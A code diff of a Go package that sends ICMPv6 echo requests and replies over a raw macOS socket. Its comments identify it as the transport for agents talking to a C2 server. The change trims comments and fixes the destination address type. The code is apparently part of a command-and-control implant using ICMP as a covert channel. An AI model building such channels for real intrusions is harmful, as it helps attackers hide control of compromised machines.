@@ -3,13 +3,10 @@
 // Package icmpv6 – darwin.go provides user-mode ICMPv6 Echo Request / Reply
 // communication on macOS via a raw socket.
 //
-// Requires root or a process entitlement that grants CAP_NET_RAW equivalent
-// (e.g. sudo, or a signed app with com.apple.security.network.client + raw
-// socket entitlement).  This mirrors the requirement of the Linux C2 server.
+// Requires root (sudo) because it opens a raw AF_INET6 socket.
 //
 // The ICMP echo identifier is derived from the process PID (masked to 16 bits)
-// so that two agent processes running on the same host produce distinct keys on
-// the C2 server (addr#echoID multi-agent keying).
+// so that two agent processes on the same host produce distinct C2 keys.
 package icmpv6
 
 import (
@@ -70,7 +67,8 @@ func (s *Sender) SendRecv(srcIP, dstIP net.IP, payload []byte, timeoutMs uint32)
 		return nil, fmt.Errorf("marshal echo request: %w", err)
 	}
 
-	dst := &net.UDPAddr{IP: dstIP}
+	// macOS raw IPv6 sockets require *net.IPAddr, not *net.UDPAddr.
+	dst := &net.IPAddr{IP: dstIP}
 	if _, err := s.conn.WriteTo(b, dst); err != nil {
 		return nil, fmt.Errorf("send echo request: %w", err)
 	}
